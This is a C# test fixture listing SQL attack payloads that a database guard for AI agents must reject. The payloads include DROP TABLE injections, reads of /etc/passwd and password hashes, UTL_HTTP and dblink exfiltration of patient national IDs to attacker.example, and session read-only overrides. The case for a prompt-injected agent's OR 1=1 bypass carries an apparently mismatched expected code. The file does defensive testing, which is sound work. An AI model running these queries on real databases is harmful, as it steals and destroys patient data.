using GuardedDbMcp.Sql;

namespace GuardedDbMcp.UnitTests;

/// <summary>
/// The concrete attack cases from docs/threat-model.md (ids ATK-nn). Each is something a prompt-injected agent
/// could be talked into sending. The unit tests assert the guard's verdict; the integration tests replay the
/// rejected ones directly against the read-only database account to prove the second line of defence.
/// </summary>
public static class AttackCatalog
{
    public sealed record Attack(string Id, string Goal, string Sql, GuardCode Expected, SqlDialect Dialect = SqlDialect.PostgreSql)
    {
        public override string ToString() => $"{Id} {Goal}";
    }

    public static IReadOnlyList<Attack> Rejected { get; } =
    [
        new("ATK-01", "stacked DDL after a query", "SELECT * FROM patients; DROP TABLE patients", GuardCode.MultipleStatements),
        new("ATK-02", "second statement hidden behind a comment", "SELECT 1 /* harmless */; DELETE FROM patients", GuardCode.MultipleStatements),
        new("ATK-03", "DELETE inside a CTE", "WITH x AS (DELETE FROM patients RETURNING *) SELECT * FROM x", GuardCode.NotReadOnly),
        new("ATK-04", "copy data out with SELECT INTO", "SELECT * INTO stolen FROM patients", GuardCode.SelectInto),
        new("ATK-05", "lock rows to stall the clinic", "SELECT * FROM patients FOR UPDATE", GuardCode.LockingClause),
        new("ATK-06", "read a server file", "SELECT pg_read_file('/etc/passwd')", GuardCode.FunctionNotAllowed),
        new("ATK-07", "time-based probing / DoS", "SELECT pg_sleep(30)", GuardCode.FunctionNotAllowed),
        new("ATK-08", "dynamic SQL through query_to_xml", "SELECT query_to_xml('select * from internal_api_keys', true, true, '')", GuardCode.FunctionNotAllowed),
        new("ATK-09", "switch the session out of read-only", "SELECT set_config('default_transaction_read_only', 'off', false)", GuardCode.FunctionNotAllowed),
        new("ATK-10", "network egress of TCKNs via UTL_HTTP", "SELECT UTL_HTTP.REQUEST('http://attacker.example/' || tckn) FROM patients", GuardCode.FunctionNotAllowed, SqlDialect.Oracle),
        new("ATK-11", "dynamic SQL through DBMS_XMLGEN", "SELECT DBMS_XMLGEN.GETXML('select * from staff') FROM dual", GuardCode.FunctionNotAllowed, SqlDialect.Oracle),
        new("ATK-12", "catalog reconnaissance", "SELECT usename, passwd FROM pg_catalog.pg_shadow", GuardCode.TableNotAllowed),
        new("ATK-13", "read a table outside the policy", "SELECT secret FROM internal_api_keys", GuardCode.TableNotAllowed),
        new("ATK-14", "read a denied column", "SELECT username, password_hash FROM staff", GuardCode.ColumnDenied),
        new("ATK-16", "predicate oracle on a masked column", "SELECT id FROM patients WHERE tckn LIKE '1%'", GuardCode.ProtectedColumnInPredicate),
        new("ATK-17", "predicate oracle hidden in CASE", "SELECT id FROM patients WHERE CASE WHEN SUBSTR(tckn, 1, 1) = '1' THEN 1 ELSE 0 END = 1", GuardCode.ProtectedColumnInPredicate),
        new("ATK-18", "membership oracle through IN (subquery)", "SELECT 1 FROM clinics WHERE '10000000146' IN (SELECT tckn FROM patients)", GuardCode.ProtectedColumnInPredicate),
        new("ATK-19", "ordering oracle", "SELECT id FROM patients ORDER BY tckn", GuardCode.ProtectedColumnInPredicate),
        new("ATK-20", "aggregate oracle in HAVING", "SELECT COUNT(*) FROM patients HAVING MAX(tckn) > '5'", GuardCode.ProtectedColumnInPredicate),
        new("ATK-21", "join oracle on a masked column", "SELECT p.id FROM patients p JOIN patients q ON p.tckn = q.tckn", GuardCode.ProtectedColumnInPredicate),
        new("ATK-22", "reach the table through another schema", "SELECT * FROM public.patients", GuardCode.TableNotAllowed),
        new("ATK-23", "database link to another database", "SELECT * FROM patients@prod", GuardCode.DatabaseLink, SqlDialect.Oracle),
        new("ATK-24", "inline PL/SQL in WITH", "WITH FUNCTION f RETURN NUMBER IS BEGIN EXECUTE IMMEDIATE 'DROP TABLE x'; RETURN 1; END; SELECT f() FROM dual", GuardCode.NotReadOnly, SqlDialect.Oracle),
        new("ATK-25", "full-width semicolon (homoglyph)", "SELECT 1；DROP TABLE patients", GuardCode.LexicalError),
        new("ATK-26", "nested-comment desynchronisation", "SELECT 1 /* /* */ ; DROP TABLE patients; */", GuardCode.LexicalError),
        new("ATK-27", "dollar-quoted payload", "SELECT $$; DROP TABLE patients; $$", GuardCode.LexicalError),
        new("ATK-28", "override the row-policy parameter", "SELECT * FROM patients WHERE clinic_id = @clinic_id OR 1 = 1", GuardCode.DatabaseLink),
        new("ATK-29", "join explosion", "SELECT 1 FROM clinics a, clinics b, clinics c, clinics d, clinics e, clinics f, clinics g, clinics h, clinics i, clinics j, clinics k, clinics l, clinics m", GuardCode.TooComplex),
        new("ATK-30", "catalog probing via regclass cast", "SELECT 'pg_authid'::regclass", GuardCode.TypeNotAllowed),
        new("ATK-31", "pseudo-column ROWID / session user", "SELECT ROWID, USER FROM patients", GuardCode.UnknownColumn, SqlDialect.Oracle),
        new("ATK-32", "server configuration leak", "SELECT current_setting('data_directory')", GuardCode.FunctionNotAllowed),
        new("ATK-33", "dblink table function", "SELECT * FROM dblink('host=attacker.example', 'select 1')", GuardCode.FunctionNotAllowed),
        new("ATK-34", "large-object import of a server file", "SELECT lo_import('/etc/passwd')", GuardCode.FunctionNotAllowed),
    ];

    public static TheoryData<Attack> RejectedData()
    {
        var data = new TheoryData<Attack>();
        foreach (var a in Rejected)
        {
            data.Add(a);
        }

        return data;
    }
}
